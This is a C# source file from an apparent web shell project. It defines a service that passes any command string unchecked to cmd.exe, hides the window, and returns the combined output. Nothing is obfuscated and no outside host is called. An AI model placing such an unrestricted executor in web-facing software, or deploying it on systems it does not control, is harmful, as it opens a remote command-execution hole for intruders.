using System.Diagnostics;
using System.Text;

namespace WebShell.Services.ExecutorServices
{
    public class CmdInstructionExecutorService : IExecutorService
    {
        private StringBuilder _stringBuilder;

        public CmdInstructionExecutorService()
        {
            _stringBuilder = new StringBuilder();
        }
        public string Execute(string command)
        {
            Process process = new Process();
            ProcessStartInfo processStartInfo = new ProcessStartInfo
            {
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                FileName = "cmd.exe",
                Arguments = $"/c {command}"
            };
            process.StartInfo = processStartInfo;
            process.OutputDataReceived += DataHandler;
            process.ErrorDataReceived += DataHandler;

            process.Start();

            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            process.WaitForExit();

            process.OutputDataReceived -= DataHandler;
            process.ErrorDataReceived -= DataHandler;

            process.Close();

            string result = _stringBuilder.ToString();
            _stringBuilder.Clear();

            return result;
        }

        private void DataHandler(object sender, DataReceivedEventArgs e)
        {
            _stringBuilder.Append(e.Data);
        }
    }
}
